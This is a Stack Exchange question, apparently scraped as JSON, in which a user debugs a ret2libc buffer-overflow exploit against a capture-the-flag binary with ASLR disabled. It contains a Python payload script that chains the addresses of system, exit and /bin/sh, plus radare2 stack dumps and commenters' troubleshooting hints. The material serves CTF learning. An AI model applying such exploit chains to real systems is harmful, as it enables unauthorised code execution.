{
    "title": "exploiting a binary using ret2libc",
    "link": "https://reverseengineering.stackexchange.com/questions/24644/exploiting-a-binary-using-ret2libc",
    "content": "I ran into this binary at a CTF :\nhttps://github.com/auehc/AUCTF-2020/tree/master/Pwn/House%20of%20Madness\nI first tried to exploit it and get a shell using ret2libc technique, however I didn't succeed.\nI know it is not the intended way to solve the challenge, but after the CTF, I am now focusing\non achieving ret2libc on this binary. And I am now stuck and need help :)\nThe source is in <pre><code>challenge.c</code></pre>, and the compiled version is <pre><code>challenge</code></pre>.\nASLR is disabled for the challenge, and on my computer too :\n<pre><code>$ > cat /proc/sys/kernel/randomize_va_space\n0\n</code></pre>\nIt is possible to trigger a buffer overflow using this input : \n<pre><code>\"2\n4\n3\nStephen\n\"\n</code></pre>\nplus some padding.\nI wrote an exploit to try to pop a shell (without success) :\n<pre><code>#!/usr/bin/env python2\n\nimport struct\n\nvalid_input = \"2\n4\n3\nStephen\n\"\npad = \"aaaaaaaa2Aa3Aa4Aa5Aa6Aa7aaaa\"\nbinsh = struct.pack(\"I\", 0xf7f4caaa)\nsystem = struct.pack(\"I\", 0xf7e0c9e0)\nexit = struct.pack(\"<I\", 0xf7dffa60)\n\nexploit = valid_input \\\n        + pad \\\n        + system \\\n        + exit \\\n        + binsh\nprint exploit\n</code></pre>\nNow, I will tell you why I don't understand why it's not working.\nWhen i break on the <pre><code>ret</code></pre> in the function where I triggered the buffer overflow, the stack looks like this:\n<pre><code>[0x56556684]> pxw 16 @esp\n0xffffd23c  0xf7e0c9e0 0xf7dffa60 0xf7f4caaa 0xffffd200  ....`...........\n</code></pre>\nso, you can see that first there is <pre><code>0xf7e0c9e0</code></pre>, then <pre><code>0xf7dffa60</code></pre>, then <pre><code>0xf7f4caaa</code></pre>.\n<pre><code>0xf7e0c9e0</code></pre> is the address of system in the libc :\n<pre><code>[0x56556684]> dmi libc system\n257   0x0012a2c0 0xf7ef82c0 GLOBAL FUNC   102       svcerr_systemerr\n658   0x0003e9e0 0xf7e0c9e0 GLOBAL FUNC   55        __libc_system\n1525  0x0003e9e0 0xf7e0c9e0 WEAK   FUNC   55        system\n</code></pre>\n<pre><code>0xf7dffa60</code></pre> is the address of exit, altough it shouldn't be needed, if I popped the shell.\n<pre><code>0xf7f4caaa</code></pre> is the address of the string <pre><code>/bin/sh\\x00</code></pre> in the libc :\n<pre><code>[0x56556684]> px10@0xf7f4caaa\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0xf7f4caaa  2f62 696e 2f73 6800 6578                 /bin/sh.ex\n</code></pre>\nI am stuck there, and can't figure out what is happening.. If anyone can point me in the right direction, I would be very happy :)\n",
    "votes": "0",
    "answers": 0,
    "views": "342",
    "tags": [
        "radare2",
        "exploit",
        "buffer-overflow",
        "stack",
        "libc"
    ],
    "user": "aguilbau",
    "time": "Apr 7, 2020 at 12:51",
    "comments": [
        {
            "user": "stylo",
            "text": "Why do you need <pre><code>exit</code></pre> address if you're not using it? when the <pre><code>ret</code></pre> instruction is executed, the <pre><code>system</code></pre> address is been popped out of the stack and the next 4 bytes are considered as the first argument of the function which, in this case, is <pre><code>exit</code></pre> address. try replacing it with the <pre><code>/bin/sh</code></pre> address, it should work.\n",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "@stylo Actually, the next 4 bytes are for the next return address after system, so <pre><code>exit</code></pre> will be called after <pre><code>system</code></pre>. What is happening when you try your payload?\n",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "Also see security.stackexchange.com/q/155844, could be your problem if addresses are correct.\n",
            "time": null
        }
    ],
    "answers_data": []
}